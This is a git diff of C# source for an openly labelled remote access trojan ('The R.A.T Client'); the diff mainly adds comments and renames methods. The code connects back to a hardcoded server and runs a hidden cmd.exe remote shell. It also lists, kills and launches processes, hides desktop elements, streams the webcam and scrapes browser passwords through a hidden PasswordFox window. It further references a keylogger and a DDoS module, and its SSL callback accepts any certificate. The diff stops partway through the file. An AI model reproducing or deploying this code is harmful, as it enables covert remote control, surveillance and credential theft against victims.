@@ -1,91 +1,211 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
-using System.Net;
-using System.Net.Sockets;
-using System.IO;
-using System.Security.Cryptography;
-using System.Management;
-using System.Windows.Forms;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
-using System.Threading;
-using AForge.Video;
-using AForge.Video.DirectShow;
-using System.Data.SQLite;
-using UrlHistoryLibrary;
-using Microsoft.Win32;
-using appCom;
-using System.Drawing;
+﻿using AForge.Video; //For webcam streaming
+using AForge.Video.DirectShow; //For webcam streaming
+using appCom; //For communication with the proxy server
+using Microsoft.Win32; //For registry operations
+using System; // For basic system functions
+using System.Collections.Generic; //For dictrionary and list objects
+using System.Data.SQLite; //For reading chrome's sqlite passwords file
+using System.Diagnostics; //For process management
+using System.Drawing; //For graphics
+using System.IO; //For file operations
+using System.Management; //For creating shortcut (.lnk) files
+using System.Net; //For network information
+using System.Net.Security;
+using System.Net.Sockets; //For client sockets
+using System.Runtime.InteropServices; //For p/invokes
+using System.Security.Cryptography; //For encrypt and decrypt
+using System.Security.Cryptography.X509Certificates;
+using System.Text; //For encoding
+using System.Threading; //For threads
+using System.Threading.Tasks;
+using System.Windows.Forms; //For form fucntions
+using UrlHistoryLibrary; //For reading IE's history file
 
+/// <summary>
+/// The R.A.T Client
+/// </summary>
 namespace TutClient
 {
+    /// <summary>
+    /// The main module
+    /// </summary>
     class Program
     {
-        public static int fps = 100;  //frame rate adjustement
+        /// <summary>
+        /// Frame rate control variable
+        /// </summary>
+        public static int fps = 100;
 
+        /// <summary>
+        /// MCI Send String for openind the CD Tray
+        /// </summary>
+        /// <param name="lpstrCommand">Command</param>
+        /// <param name="lpstrReturnString">Return Value</param>
+        /// <param name="uReturnLength">Return value's length</param>
+        /// <param name="hwndCallback">Callback's handle</param>
         [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
         public static extern void mciSendStringA(string lpstrCommand,
         string lpstrReturnString, int uReturnLength, int hwndCallback);
+        /// <summary>
+        /// Find window for reading data from PasswordFox
+        /// </summary>
+        /// <param name="className">Window's class name</param>
+        /// <param name="windowText">The text of the window</param>
+        /// <returns>The handle of the window</returns>
         [DllImport("user32.dll")]
         private static extern int FindWindow(string className, string windowText);
+        /// <summary>
+        /// Show Window for hiding password fox's window, while still reading passwords from it
+        /// </summary>
+        /// <param name="hwnd">The handle of the window</param>
+        /// <param name="command">The command to send</param>
+        /// <returns>The success</returns>
         [DllImport("user32.dll")]
         private static extern int ShowWindow(int hwnd, int command);
+        /// <summary>
+        /// Find a child window, for PF's listView
+        /// </summary>
+        /// <param name="hWnd1">The handle of the parent window</param>
+        /// <param name="hWnd2">The handle of the control to get the next child after</param>
+        /// <param name="lpsz1">The class of the window</param>
+        /// <param name="lpsz2">The text of the window</param>
+        /// <returns></returns>
         [DllImport("User32.dll")]
         private static extern int FindWindowEx(int hWnd1, int hWnd2, string lpsz1, string lpsz2);
-        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
-        public static extern int GetDesktopWindow();
+        /// <summary>
+        /// Detect shutdown, logout ctrl c, and other signals to notify the server when disconnecting
+        /// </summary>
+        /// <param name="handler">The event handler to attach</param>
+        /// <param name="add">True if the event handler should be added, otherwise false</param>
+        /// <returns>The success</returns>
         [DllImport("Kernel32")]
         private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
+        /// <summary>
+        /// Generate a mouse event
+        /// </summary>
+        /// <param name="dwFlags">The ID of the click to do</param>
+        /// <param name="dx"></param>
+        /// <param name="dy"></param>
+        /// <param name="dwData"></param>
+        /// <param name="dwExtraInfo"></param>
         [DllImport("user32.dll")]
         static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
 
+        /// <summary>
+        /// Signal Event Handler
+        /// </summary>
+        /// <param name="sig">The signal sent by the OS</param>
+        /// <returns>True if the signal is handled</returns>
         private delegate bool EventHandler(CtrlType sig);
+        /// <summary>
+        /// New signal handler
+        /// </summary>
         static EventHandler _handler;
 
+        /// <summary>
+        /// Shutdown signal types
+        /// </summary>
         enum CtrlType
         {
+            /// <summary>
+            /// Control + C pressed
+            /// </summary>
             CTRL_C_EVENT = 0,
+            /// <summary>
+            /// Break pressed
+            /// </summary>
             CTRL_BREAK_EVENT = 1,
+            /// <summary>
+            /// Window closed
+            /// </summary>
             CTRL_CLOSE_EVENT = 2,
+            /// <summary>
+            /// User logged off
+            /// </summary>
             CTRL_LOGOFF_EVENT = 5,
+            /// <summary>
+            /// User stopped the OS
+            /// </summary>
             CTRL_SHUTDOWN_EVENT = 6
         }
 
-        public enum errorType
+        /// <summary>
+        /// R.A.T Remote Error Codes
+        /// </summary>
+        public enum ErrorType
         {
+            /// <summary>
+            /// File can't be located
+            /// </summary>
             FILE_NOT_FOUND = 0x00,
+            /// <summary>
+            /// Access to process is denied, when killing
+            /// </summary>
             PROCESS_ACCESS_DENIED = 0x01,
+            /// <summary>
+            /// Cannot encrypt data
+            /// </summary>
             ENCRYPT_DATA_CORRUPTED = 0x02,
+            /// <summary>
+            /// Cannot decrypt data
+            /// </summary>
             DECRYPT_DATA_CORRUPTED = 0x03,
+            /// <summary>
+            /// Cannot find the specified directory
+            /// </summary>
             DIRECTORY_NOT_FOUND = 0x04,
+            /// <summary>
+            /// Invalid device selected with mic or cam stream
+            /// </summary>
             DEVICE_NOT_AVAILABLE = 0x05,
+            /// <summary>
+            /// Password recovery failed
+            /// </summary>
             PASSWORD_RECOVERY_FAILED = 0x06,
+            /// <summary>
+            /// Error, when reading from the remote CMD module
+            /// </summary>
             CMD_STREAM_READ = 0X07,
+            /// <summary>
+            /// Cannot find specified path
+            /// </summary>
             FILE_AND_DIR_NOT_FOUND = 0x08,
+            /// <summary>
+            /// Specified file already exists
+            /// </summary>
             FILE_EXISTS = 0x09,
+            /// <summary>
+            /// Elevated privileges are required to run this module
+            /// </summary>
             ADMIN_REQUIRED = 0x10
         }
 
+        /// <summary>
+        /// Custom signal handler
+        /// </summary>
+        /// <param name="sig">The incoming signal</param>
+        /// <returns>True if the signal is handled</returns>
         private static bool Handler(CtrlType sig)
         {
+            //In every case shutdown existing IPC connections and notify the server of the disconnect
+
             switch (sig)
             {
                 case CtrlType.CTRL_C_EVENT:
                     StopIPCHandler();
-                    sendCommand("dclient");
+                    SendCommand("dclient");
                     return true;
                 case CtrlType.CTRL_LOGOFF_EVENT:
                     StopIPCHandler();
-                    sendCommand("dclient");
+                    SendCommand("dclient");
                     return true;
                 case CtrlType.CTRL_SHUTDOWN_EVENT:
                     StopIPCHandler();
-                    sendCommand("dclient");
+                    SendCommand("dclient");
                     return true;
                 case CtrlType.CTRL_CLOSE_EVENT:
                     StopIPCHandler();
-                    sendCommand("dclient");
+                    SendCommand("dclient");
                     //Thread.Sleep(1000);
                     return true;
                 default:
@@ -93,29 +213,77 @@ namespace TutClient
             }
         }
 
+        /// <summary>
+        /// Mouse Event Codes
+        /// </summary>
         [Flags]
         public enum MouseEventFlags
         {
+            /// <summary>
+            /// Press down the left click
+            /// </summary>
             LEFTDOWN = 0x00000002,
+            /// <summary>
+            /// Release the left click
+            /// </summary>
             LEFTUP = 0x00000004,
+            /// <summary>
+            /// Press down the middle (scroll) button
+            /// </summary>
             MIDDLEDOWN = 0x00000020,
+            /// <summary>
+            /// Release the middle (scroll) button
+            /// </summary>
             MIDDLEUP = 0x00000040,
+            /// <summary>
+            /// Move the mouse
+            /// </summary>
             MOVE = 0x00000001,
+            /// <summary>
+            /// ?
+            /// </summary>
             ABSOLUTE = 0x00008000,
+            /// <summary>
+            /// Press down the right click
+            /// </summary>
             RIGHTDOWN = 0x00000008,
+            /// <summary>
+            /// Release the right click
+            /// </summary>
             RIGHTUP = 0x00000010
         }
 
+        /// <summary>
+        /// Show window code -> HIDE
+        /// </summary>
         private const int SW_HIDE = 0;
+        /// <summary>
+        /// Show window code -> SHOW
+        /// </summary>
         private const int SW_SHOW = 1;
 
+        /// <summary>
+        /// The client socket
+        /// </summary>
         private static Socket _clientSocket = new Socket
             (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
+        /// <summary>
+        /// The port to connect to
+        /// </summary>
         private const int _PORT = 100; // same as server port
 
+        /// <summary>
+        /// STDOUT from remote CMD
+        /// </summary>
         private static StreamReader fromShell;
+        /// <summary>
+        /// STDIN to remote CMD
+        /// </summary>
         private static StreamWriter toShell;
+        /// <summary>
+        /// STDERR from remote CMD
+        /// </summary>
         private static StreamReader error;
 
         private static String fup_location = "";
@@ -128,158 +296,184 @@ namespace TutClient
         private static bool isKlThreadRunning = false;
         private static NAudio.Wave.WaveInEvent streaming;
         private static VideoCaptureDevice source;
-        private static ddos DDoS;
+        private static DDoS DDoS;
         private static Process cmdProcess;
         private static bool applicationHidden = false;
         private static Client _ipcClient;
         private static ProcessData ipcProcess;
         private static string getScreens; //get screens count
         public static int ScreenNumber = 0;
+        public static bool IsLinuxServer = true;
+        public static SslStream _sslClient;
 
+        /// <summary>
+        /// R.A.T Entry point
+        /// </summary>
+        /// <param name="args">Command-Line arguments</param>
         static void Main(string[] args)
         {
-            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE);
-            _handler += new EventHandler(Handler);
-            SetConsoleCtrlHandler(_handler, true);
-            ServicePointManager.UseNagleAlgorithm = false;
-            ConnectToServer();
-            StartIPCHandler();
-            RequestLoop();
+            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
+            _handler += new EventHandler(Handler); //Create a new handler
+            SetConsoleCtrlHandler(_handler, true); //Assign the custom handler function
+            ServicePointManager.UseNagleAlgorithm = false; //Disable Nagle algorithm (Short Quick TCP packets don't get collected sent at once)
+            ConnectToServer(); //Connect to the R.A.T Server
+            StartIPCHandler(); //Start IPC Manager
+            RequestLoop(); //Request command from the server
         }
 
-        //Stop the IPC handler
-
+        /// <summary>
+        /// Stop the IPC Handler and kill out client
+        /// </summary>
         private static void StopIPCHandler()
         {
-            if (_ipcClient == null) return;
-            _ipcClient.StopPipe();
-            _ipcClient = null;
+            if (_ipcClient == null) return; //Check if the client is running
+            _ipcClient.StopPipe(); //Stop the client
+            _ipcClient = null; //Set the client to null
         }
 
-        //Start the IPC handler
-
+        /// <summary>
+        /// Start handling IPC connections
+        /// </summary>
         private static void StartIPCHandler()
         {
-            Client ipcClient = new Client();
-            ipcClient.OnMessageReceived += new Client.OnMessageReceivedEventHandler(ReadIPC);
-            _ipcClient = ipcClient;
+            Client ipcClient = new Client(); //Create a new IPC client
+            ipcClient.OnMessageReceived += new Client.OnMessageReceivedEventHandler(ReadIPC); //Subscribe to the message receiver
+            _ipcClient = ipcClient; //Set the global client
         }
 
-        //Launch the child processes you want to communicate with
-
+        /// <summary>
+        /// Start IPC Child processes
+        /// </summary>
+        /// <param name="servername">The server to start</param>
         private static void LaunchIPCChild(string servername)
         {
-            string filepath = "";
-            if (servername == "tut_client_proxy")
+            string filepath = ""; //The path to the server's exe file
+            if (servername == "tut_client_proxy") //If the proxy server is specified
             {
-                filepath = @"proxy\proxyServer.exe";
+                filepath = @"proxy\proxyServer.exe"; //Set the proxy server's path
             }
 
-            ProcessData tempProcess = ProcessData.CheckProcessName("proxyServer", "tut_client_proxy");
-            ipcProcess = tempProcess;
+            ProcessData tempProcess = ProcessData.CheckProcessName("proxyServer", "tut_client_proxy"); //Get the process data of the proxySevrer
+            ipcProcess = tempProcess; //Set the global IPC Process
 
-            if ((ipcProcess != null && !ipcProcess.IsPipeOnline("tut_client_proxy")) || ipcProcess == null)
+            if ((ipcProcess != null && !ipcProcess.IsPipeOnline("tut_client_proxy")) || ipcProcess == null) //Check if the server is offline
             {
-                Process p = new Process();
-                p.StartInfo.FileName = filepath;
-                p.StartInfo.Arguments = "use_ipc";
-                p.Start();
-                ipcProcess = new ProcessData(p.Id, "tut_client_proxy");
-                Thread.Sleep(1500);
+                Process p = new Process(); //Create a new process object
+                p.StartInfo.FileName = filepath; //Set the exe path
+                p.StartInfo.Arguments = "use_ipc"; //Specify the IPC flag for the proxy
+                p.Start(); //Start the proxy Server
+                ipcProcess = new ProcessData(p.Id, "tut_client_proxy"); //Get a new process data
+                Thread.Sleep(1500); //Wait for the server to start
             }
 
-            _ipcClient.ConnectPipe("tut_client_proxy", 0);
+            _ipcClient.ConnectPipe("tut_client_proxy", 0); //Connect to the server
         }
 
-        //Read and forward all IPC traffic
-
+        /// <summary>
+        /// IPC Receive Messages Callback
+        /// </summary>
+        /// <param name="e">Message event args</param>
         private static void ReadIPC(ClientMessageEventArgs e)
         {
-            string msg = e.Message;
+            string msg = e.Message; //Get the message
             Console.WriteLine("IPC Message: " + msg);
-            sendCommand("ipc§" + "tut_client_proxy" + "§" + msg);
+            SendCommand("ipc§" + "tut_client_proxy" + "§" + msg); //Forward output to R.A.T Server
         }
 
+        /// <summary>
+        /// Resolve a DNS name into an IP Address
+        /// </summary>
+        /// <param name="input">The DNS name to resolve</param>
+        /// <returns>The IP Address if resolvation is successful, otherwise null</returns>
         private static string ResolveDns(string input)
         {
             try
             {
-                string ipAddr = Dns.GetHostAddresses(input)[0].ToString();
-                return ipAddr;
+                string ipAddr = Dns.GetHostAddresses(input)[0].ToString(); //Try to get the first result
+                return ipAddr; //Return the IP Address
             }
-            catch (Exception ex)
+            catch (Exception ex) //Something went wrong
             {
                 Console.WriteLine("Dns Resolve on input: " + input + " failed\r\n" + ex.Message);
-                return null;
+                return null; //Return null
             }
         }
 
+        /// <summary>
+        /// Convert a connection string to an IP Address
+        /// </summary>
+        /// <param name="input">The connection string</param>
+        /// <returns>The IP Address of the R.A.T Server if can be parsed, otherwise false</returns>
         private static string GetIPAddress(string input)
         {
-            if (input == "") return null;
-            bool validIP = true;
+            if (input == "") return null; //Filter empty input
+            bool validIP = true; //True if input is a valid IP
 
-            if (input.Contains("."))
+            if (input.Contains(".")) //Input contains dots
             {
-                String[] parts = input.Split('.');
-                if (parts.Length == 4)
+                String[] parts = input.Split('.'); //Get the octects
+                if (parts.Length == 4) //If 4 octets present
                 {
-                    foreach (String ipPart in parts)
+                    foreach (String ipPart in parts) //Loop throught them
                     {
-                        for (int i = 0; i < ipPart.Length; i++)
+                        for (int i = 0; i < ipPart.Length; i++) //Check char by char
                         {
-                            if (!char.IsNumber(ipPart[i]))
+                            if (!char.IsNumber(ipPart[i])) //If char isn't a nuber, then input isn't an IP
                             {
-                                validIP = false;
-                                break;
+                                validIP = false; //Invalid for IP
+                                break; //Break out
                             }
                         }
 
-                        if (!validIP)
+                        if (!validIP) //Invalid IP Address
                         {
                             Console.WriteLine("Invalid IP Address!\r\nInput is not an IP Address");
-                            break;
+                            break; //Break
                         }
                     }
 
-                    if (validIP)
+                    if (validIP) //IP was valid
                     {
-                        return input;
+                        return input; //Return the IP
                     }
-                    else
+                    else //Invalid IP
                     {
                         //Pretend that the input is a hostname
                         return ResolveDns(input);
                     }
                 }
-                else
+                else //input doesn't have 4 parts, but it can be still a hostname
                 {
-                    return ResolveDns(input);
+                    return ResolveDns(input); //Get the IP of the DNS name
                 }
             }
 
-            return null;
+            return null; //All parsing failed at this point
         }
 
+        /// <summary>
+        /// Connect to the R.A.T Server
+        /// </summary>
         private static void ConnectToServer()
         {
-            int attempts = 0;
+            int attempts = 0; //Connection attempts to the server
 
-            while (!_clientSocket.Connected)
+            while (!_clientSocket.Connected) //Connect while the client isn't connected
             {
                 try
                 {
-                    attempts++;
+                    attempts++; //1 more attempt
                     Console.WriteLine("Connection attempt " + attempts);
 
-                    string connectionString = GetIPAddress("192.168.10.56"); //Replace IP with DNS if you want
+                    string connectionString = GetIPAddress("192.168.10.96"); //Replace IP with DNS if you want
                   
-                    _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //ip is your local ip OR WAN Domain if you going for WAN control
+                    _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //Try to connect to the server
                     Thread.Sleep(500);
                 }
-                catch (SocketException)
+                catch (SocketException) //Couldn't connect to server
                 {
-                    if (RDesktop.isShutdown == false) // added this as it was still trying to send the screen after disconnection
+                    //Shutdown the remote desktop
+                    if (RDesktop.isShutdown == false)
                     {
                         RDesktop.isShutdown = true;
                     }
@@ -288,25 +482,30 @@ namespace TutClient
             }
 
             Console.Clear();
-            Console.WriteLine("Connected");
+            Console.WriteLine("Connected"); //Client connected
         }
 
-
-        //Request Loop (getting command from server)
-
+        /// <summary>
+        /// Read commands from the server
+        /// </summary>
         private static void RequestLoop()
         {
-            //Console.WriteLine(@"<Type ""exit"" to properly disconnect client>");
-
-            while (true)
+            if (IsLinuxServer)
             {
-                //SendRequest();
-                if (isDisconnect) break;
-                ReceiveResponse();
+                _sslClient = new SslStream(new NetworkStream(_clientSocket), false, new RemoteCertificateValidationCallback(ValidateSSLConnection), null);
+                _sslClient.AuthenticateAsClient("");
+                LaunchHearthbeat();
             }
 
-            Console.WriteLine("Connection Ended");
-            //checkServer(Decrypt(File.ReadAllLines(app + "\\config\\main.cfg")[0]));
+            while (true) //While the connection is alive
+            {
+                //SendRequest();
+                if (isDisconnect) break; //If we need to disconnect, then break out
+                ReceiveResponse(); // Receive data from the server
+            }
+
+            Console.WriteLine("Connection Ended"); //Disconnected at this point
+            //Shutdown the client, then reconnect to the server
             _clientSocket.Shutdown(SocketShutdown.Both);
             _clientSocket.Close();
             _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -315,42 +514,80 @@ namespace TutClient
             RequestLoop();
         }
 
-        public static void reportError(errorType type, String title, String message)
+        private static void LaunchHearthbeat()
         {
-            String data = "error§" + type + "§" + title + "§" + message;
-            sendCommand(data);
+            Task t = new Task(() => {
+
+                while (true)
+                {
+                    if (_clientSocket.Connected && _sslClient != null && _sslClient.CanWrite)
+                    {
+                        SendCommand("hearthbeat");
+                    }
+
+                    Thread.Sleep(10000);
+                }
+
+            });
+
+            t.Start();
         }
 
+        private static bool ValidateSSLConnection(object sender, X509Certificate senderCert, X509Chain certChain, SslPolicyErrors errorPolicy)
+        {
+            return true; //TODO: add certificate pinning functionallity
+        }
+
+        /// <summary>
+        /// Report a client-side error to the R.A.T Server
+        /// </summary>
+        /// <param name="type">The error type/code</param>
+        /// <param name="title">The short title of the error</param>
+        /// <param name="message">The longer message of the error</param>
+        public static void ReportError(ErrorType type, String title, String message)
+        {
+            String data = "error§" + type + "§" + title + "§" + message; //Create command
+            SendCommand(data); //Send to server
+        }
+
+        /// <summary>
+        /// Get commands from multiple TCP packets incoming as one
+        /// </summary>
+        /// <param name="rawData">The string converted incoming data</param>
+        /// <returns>An array of command sent by the server</returns>
         private static String[] GetCommands(string rawData)
         {
-            List<string> commands = new List<string>();
-            int readBack = 0;
+            List<string> commands = new List<string>(); //The command sent by the server
+            int readBack = 0; //How much to read back from the current char pointer
 
-            for (int i = 0; i < rawData.Length; i++)
+            for (int i = 0; i < rawData.Length; i++) // Go through the message
             {
-                char current = rawData[i];
-                if (current == '§')
+                char current = rawData[i]; //Get the current character
+                if (current == '§') //If we see this char -> message delimiter
                 {
-                    int dataLength = int.Parse(rawData.Substring(readBack, i - readBack));
-                    string command = rawData.Substring(i + 1, dataLength);
-                    i = i + 1 + dataLength;
-                    readBack = i;
-                    commands.Add(command);
+                    int dataLength = int.Parse(rawData.Substring(readBack, i - readBack)); //Get the length of the command string
+                    string command = rawData.Substring(i + 1, dataLength); //Get the command string itself
+                    i = i + 1 + dataLength; //Skip the current command
+                    readBack = i; //Set the read back point to here
+                    commands.Add(command); //Add this command to the list
                 }
             }
 
-            return commands.ToArray();
+            return commands.ToArray(); //Return the command found
         }
             
-
+        /// <summary>
+        /// Handle the commands from the server
+        /// </summary>
+        /// <param name="text">The plaintext command message</param>
         private static void HandleCommand(string text)
         {
             if (text == "tskmgr")// i added this to start task manager
             {
-                Process p = new Process();
-                p.StartInfo.FileName = "Taskmgr.exe";
-                p.StartInfo.CreateNoWindow = true;
-                p.Start();
+                Process p = new Process(); //Create a new process object
+                p.StartInfo.FileName = "Taskmgr.exe"; //Task Manager
+                p.StartInfo.CreateNoWindow = true; //Don't draw the window of the task manager
+                p.Start(); //Start the process
             }
 
             if (text == "fpslow")    //FPS 
@@ -374,36 +611,37 @@ namespace TutClient
                 Console.WriteLine("FPS now 100");
             }
           
-            if (text == "control.you")
+            if (text == "control.you") //The first ever command, no use cases
             {
-                sendCommand("OK! then");
+                SendCommand("OK! then");
             }
 
-            if (text.StartsWith("getinfo-"))
+            if (text.StartsWith("getinfo-")) //Server requested info
             {
                 int myid = int.Parse(text.Split('-')[1]); //get the client id
-                String allInfo = Environment.MachineName + "|" + GetLocalIPAddress() + "|" + DateTime.Now.ToString() + "|" + AvName();
+                String allInfo = Environment.MachineName + "|" + GetLocalIPAddress() + "|" + DateTime.Now.ToString() + "|" + AvName(); //Create the info string
                 Console.WriteLine(allInfo);
-                String resp = "infoback;" + myid.ToString() + ";" + allInfo;
-                sendCommand(resp);
+                String resp = "infoback;" + myid.ToString() + ";" + allInfo; //Create client response
+                SendCommand(resp); //Send the response to the server
             }
 
-            if (text.StartsWith("msg"))
+            if (text.StartsWith("msg")) //Display a messagebox
             {
-                createMessage(text.Split('|'));
+                CreateMessage(text.Split('|')); //Parse the data and show the messagebox
             }
 
-            if (text.StartsWith("freq-"))
+            if (text.StartsWith("freq-")) //Play a freuqency
             {
-                int freq = int.Parse(text.Split('-')[1]);
-                generateFreq(freq, 2); //Duration in seconds
+                int freq = int.Parse(text.Split('-')[1]); //Get the target frequency
+                GenerateFreq(freq, 2); //Play that frequency for 2 seconds
             }
 
-            if (text.StartsWith("sound-"))
+            if (text.StartsWith("sound-")) //Play a system sound
             {
-                String snd = text.Split('-')[1];
-                System.Media.SystemSound sound = System.Media.SystemSounds.Asterisk;
+                String snd = text.Split('-')[1]; //Get the ID of the sound
+                System.Media.SystemSound sound = System.Media.SystemSounds.Asterisk; //Create a sound var
 
+                //Parse the ID to actual sound object
                 switch (snd)
                 {
                     case "0":
@@ -423,45 +661,46 @@ namespace TutClient
                         break;
                 }
               
-                sound.Play();
+                sound.Play(); //Play the system sound
             }
 
-            if (text.StartsWith("t2s|"))
+            if (text.StartsWith("t2s|")) //Text to speech
             {
-                String txt = text.Split('|')[1];
-                t2s(txt);
+                String txt = text.Split('|')[1]; //Get the text to read
+                T2S(txt); //Read the text
             }
 
-            if (text.StartsWith("cd|"))
+            if (text.StartsWith("cd|")) //Manipulate the CD Tray
             {
-                String opt = text.Split('|')[1];
+                String opt = text.Split('|')[1]; //Get the desired state of the CD Tray
 
-                if (opt == "open")
+                if (opt == "open") //Open it
                 {
                     mciSendStringA("set CDAudio door open", "", 127, 0);
                 }
-                else
+                else //Close it
                 {
                     mciSendStringA("set CDAudio door closed", "", 127, 0);
                 }
             }
 
-            if (text.StartsWith("emt|"))
+            if (text.StartsWith("emt|")) //Manipulate windows elements
             {
-                String action = text.Split('|')[1];
-                String element = text.Split('|')[2];
+                String action = text.Split('|')[1]; //Hide/Show
+                String element = text.Split('|')[2]; //The element to manipulate
 
+                //Determine the element and show/hide it
                 switch (element)
                 {
                     case "task":
 
                         if (action == "hide")
                         {
-                            hTaskBar();
+                            HTaskBar();
                         }
                         else
                         {
-                            sTaskBar();
+                            STaskBar();
                         }
 
                         break;
@@ -470,11 +709,11 @@ namespace TutClient
 
                         if (action == "hide")
                         {
-                            hClock();
+                            HClock();
                         }
                         else
                         {
-                            sClock();
+                            SClock();
                         }
 
                         break;
@@ -483,11 +722,11 @@ namespace TutClient
 
                         if (action == "hide")
                         {
-                            hTrayIcons();
+                            HTrayIcons();
                         }
                         else
                         {
-                            sTrayIcons();
+                            STrayIcons();
                         }
 
                         break;
@@ -496,11 +735,11 @@ namespace TutClient
 
                         if (action == "hide")
                         {
-                            hDesktop();
+                            HDesktop();
                         }
                         else
                         {
-                            sDesktop();
+                            SDesktop();
                         }
 
                         break;
@@ -509,37 +748,37 @@ namespace TutClient
 
                         if (action == "hide")
                         {
-                            hStart();
+                            HStart();
                         }
                         else
                         {
-                            sStart();
+                            SStart();
                         }
 
                         break;
                 }
             }
 
-            if (text == "proclist")
+            if (text == "proclist") //List the running processes
             {
-                Process[] allProcess = Process.GetProcesses();
-                String dataString = "";
+                Process[] allProcess = Process.GetProcesses(); //Get the list of running processes
+                String dataString = ""; //Declare the reponse string
 
-                foreach (Process proc in allProcess)
+                foreach (Process proc in allProcess) //Go through the processes
                 {
-                    String name = proc.ProcessName;
-                    String id = proc.Id.ToString();
-                    String responding = proc.Responding.ToString();
-                    String title = proc.MainWindowTitle;
-                    String priority = "N/A";
-                    String path = "N/A";
+                    String name = proc.ProcessName; //Get the name of the process
+                    String id = proc.Id.ToString(); //Get the ID of the process
+                    String responding = proc.Responding.ToString(); //Get if the process is responding
+                    String title = proc.MainWindowTitle; //Get the main window's title
+                    String priority = "N/A"; //Get the process's priority
+                    String path = "N/A"; //Get the executable path of the process
 
-                    if (title == "") title = "N/A";
+                    if (title == "") title = "N/A"; //Filter empty titles
 
                     try
                     {
-                        priority = proc.PriorityClass.ToString();
-                        path = proc.Modules[0].FileName;
+                        priority = proc.PriorityClass.ToString(); //Get process priority
+                        path = proc.Modules[0].FileName; //Get process executable path
                     }
                     catch (Exception e)
                     {
@@ -548,6 +787,7 @@ namespace TutClient
 
                     try
                     {
+                        //Assemble the response to the server
                         String pdata = "setproc|" + name + "|" + responding + "|" + title + "|" + priority + "|" + path + "|" + id;
                         dataString += pdata + "\n";
                     }
@@ -559,46 +799,47 @@ namespace TutClient
                     //System.Threading.Thread.Sleep(100);
                 }
 
-                sendCommand(dataString);
+                SendCommand(dataString); //Send the response to the server
             }
 
-            if (text.StartsWith("prockill"))
+            if (text.StartsWith("prockill")) //Kill a process
             {
-                String id = text.Split('|')[1];
+                String id = text.Split('|')[1]; //Get the ID of the process ot kill
                 try
                 {
-                    Process.GetProcessById(int.Parse(id)).Kill();
+                    Process.GetProcessById(int.Parse(id)).Kill(); //Try to kill the process
                 }
-                catch (Exception e)
+                catch (Exception e) //Failed to kill it
                 {
                     Console.WriteLine(e.Message);
-                    reportError(errorType.PROCESS_ACCESS_DENIED, "Can't kill process", "Manager failed to kill process: " + id);
+                    ReportError(ErrorType.PROCESS_ACCESS_DENIED, "Can't kill process", "Manager failed to kill process: " + id); //Report to the server
                 }
             }
 
-            if (text.StartsWith("procstart"))
+            if (text.StartsWith("procstart")) //Create a new process
             {
                 try
                 {
-                String file = text.Split('|')[1];
+                    String file = text.Split('|')[1]; //The file to start
                   
-                String state = text.Split('|')[2];
+                    String state = text.Split('|')[2]; //Hide or Show the process
 
-                Process p = new Process();
+                    Process p = new Process(); //Create the new process's object
 
-                switch (state)
-                {
-                    case "Normal":
-                        p.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
-                        break;
+                    //Set the window style of the process
+                    switch (state)
+                    {
+                        case "Normal":
+                            p.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
+                            break;
 
-                    case "Hidden":
-                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        break;
-                }
+                        case "Hidden":
+                            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                            break;
+                    }
 
-                p.StartInfo.FileName = file;
-                p.Start();
+                    p.StartInfo.FileName = file; //Set the file path
+                    p.Start(); //Start the process
                 }
                 catch (Exception ex)
                 {
@@ -606,34 +847,39 @@ namespace TutClient
                 }
             }
 
-            if (text == "startcmd")
+            if (text == "startcmd") //Start the remote cmd module
             {
-                ProcessStartInfo info = new ProcessStartInfo();
+                ProcessStartInfo info = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe", //Set the file to cmd
+                    CreateNoWindow = true, //Don't draw a window for it
+                    UseShellExecute = false, //Don't use shell execution (needed to redirect the stdout, stdin and stderr)
+                    RedirectStandardInput = true, //Redirect stdin
+                    RedirectStandardOutput = true, //Redirect stdout
+                    RedirectStandardError = true //Redirect stderr
+                }; //Create a new startinfo object
 
-                info.FileName = "cmd.exe";
-                info.CreateNoWindow = true;
-                info.UseShellExecute = false;
-                info.RedirectStandardInput = true;
-                info.RedirectStandardOutput = true;
-                info.RedirectStandardError = true;
 
-                Process p = new Process();
+                Process p = new Process
+                {
+                    StartInfo = info
+                }; //Create a new process object
+                p.Start(); //Start the cmd
+                cmdProcess = p; //Assign a global variable
+                toShell = p.StandardInput; //Get the stdin
+                fromShell = p.StandardOutput; //Get the stdout
+                error = p.StandardError; //Get the stderr
+                toShell.AutoFlush = true; //Enable auto flushing
 
-                p.StartInfo = info;
-                p.Start();
-                cmdProcess = p;
-                toShell = p.StandardInput;
-                fromShell = p.StandardOutput;
-                error = p.StandardError;
-                toShell.AutoFlush = true;
-
-                Thread shellTherad = new Thread(new ThreadStart(getShellInput));
+                //Create and start a new reading thread
+                Thread shellTherad = new Thread(new ThreadStart(GetShellInput));
                 shellTherad.Start();
             }
 
-            if (text == "stopcmd")
+            if (text == "stopcmd") //Stop the remote cmd module
             {
-                cmdProcess.Kill();
+                cmdProcess.Kill(); //Kill the process
+                //Dispose the streams and the process itself
                 toShell.Dispose();
                 toShell = null;
                 fromShell.Dispose();
@@ -642,126 +888,126 @@ namespace TutClient
                 cmdProcess = null;
             }
 
-            if (text.StartsWith("cmd§"))
+            if (text.StartsWith("cmd§")) //Send command to the remote cmd module
             {
-                string command = text.Split('§')[1];
-                toShell.WriteLine(command + "\r\n");
+                string command = text.Split('§')[1]; //The command to enter
+                toShell.WriteLine(command + "\r\n"); //Send the command
             }
 
-            if (text == "fdrive")
+            if (text == "fdrive") //List PC drives
             {
-                DriveInfo[] drives = DriveInfo.GetDrives();
